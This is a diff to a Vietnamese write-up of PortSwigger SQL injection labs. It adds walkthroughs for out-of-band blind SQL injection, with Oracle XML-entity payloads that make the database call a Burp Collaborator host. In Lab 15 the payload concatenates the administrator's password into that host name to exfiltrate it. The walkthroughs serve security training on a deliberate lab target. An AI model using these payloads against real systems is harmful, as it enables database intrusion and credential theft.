@@ -1,4 +1,4 @@
-<img width="1483" height="811" alt="image" src="https://github.com/user-attachments/assets/6d1f6a74-d046-4136-a185-68dd872c0584" /># Write-up-All-labs-SQL-injection-PortSwigger
+<img width="1484" height="713" alt="image" src="https://github.com/user-attachments/assets/11f2611c-1195-43a0-81f6-402136744f6e" /><img width="1483" height="811" alt="image" src="https://github.com/user-attachments/assets/6d1f6a74-d046-4136-a185-68dd872c0584" /># Write-up-All-labs-SQL-injection-PortSwigger
 
 
 # Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
@@ -400,6 +400,64 @@ Và kết quả cũng được tương tự
 Và chúng ta solved được Challenge này!!
 
 <img width="1478" height="540" alt="image" src="https://github.com/user-attachments/assets/7a74682d-6d3e-42f7-ae01-0d452acf1f9e" />
+
+# Lab 14: Blind SQL injection with out-of-band interaction
+
+<img width="1111" height="819" alt="image" src="https://github.com/user-attachments/assets/62b049a4-4c29-4945-9efe-a93dfb795e75" />
+
+
+Theo mô tả của challenge thì tồn tại một lỗ hổng SQLi ở trong Cookie như những Lab trên , nhưng chúng ta không thể khai thác bằng việc xem phản hồi của Web 
+
+Để Solve bài này thì cần gây ra hiện tượng tra cứu DNS đến Burp Collaborator.
+
+Trước tiên chúng ta cần câu lệnh để thực hiện việc gửi truy vấn DNS đến máy chủ Burp Collaborator. 
+
+Cú pháp của nó như sau:
+```sql
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+```
+Bạn có thể vào PostSwigger để xem thêm nhiều payload hơn với từng hệ quản trị cơ sở dữ liệu khác nhau 
+
+Chúng ta vẫn phải xác định số cột trước đã , và xác định được câu truy vấn chỉ sử dụng 1 cột 
+
+Như form trên chúng ta cần thay bằng BURP-COLLABORATOR-SUBDOMAIN của chính chúng ta vào bằng cách bôi đen dòng `BURP-COLLABORATOR-SUBDOMAIN/` của payload nhấp vào chuột phải và chọn `Insert Collaborator payload`
+
+<img width="744" height="508" alt="image" src="https://github.com/user-attachments/assets/6e81a05b-869b-4983-a65f-003b8669c669" />
+
+Và chúng ta vào mục Collaborator chúng ta sẽ thấy những truy vấn DNS đó
+
+<img width="1370" height="396" alt="image" src="https://github.com/user-attachments/assets/7ca7bcc1-42c0-4c96-9076-191053017e0d" />
+
+Thỏa mãn yêu cầu của challenge , Chúng ta solved được Challenge này!
+ 
+<img width="1519" height="925" alt="image" src="https://github.com/user-attachments/assets/95925db2-704a-42d6-8467-d2e8a7b26d87" />
+
+# Lab 15: Blind SQL injection with out-of-band data exfiltration
+
+<img width="1122" height="830" alt="image" src="https://github.com/user-attachments/assets/4f3582dd-3f2f-4c16-85ed-ccd52d39a61d" />
+
+Mô tả đề y hệt như lab 14 nhưng lần này Chall bắt lấy password của administrator
+
+Vẫn sử dụng cú pháp như cũ:
+```sql
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+```
+Câu lệnh lấy password chúng ta cần
+```sql
+select password from users where username = 'administrator'
+```
+Vậy cái này có thể chèn vào đâu ? Chúng ta phải nối chuỗi kết quả câu lệnh lấy password nó gắn vào cái subdomain burp collaborator của chúng ta , nối chuỗi bằng dấu || vì đây đang dùng hệ quản trị cơ sở dữ liệu oracle
+
+vậy lúc này payload sẽ là 
+```sql
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||select password from users where username = 'administrator'||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+```
+
+<img width="1142" height="669" alt="image" src="https://github.com/user-attachments/assets/4a723cf2-edb7-4872-9b02-62f554f82da9" />
+
+`password:uw2m2f599wxa5od9tkw7`
+
+
 
 
 # Lab 16: SQL injection with filter bypass via XML encoding
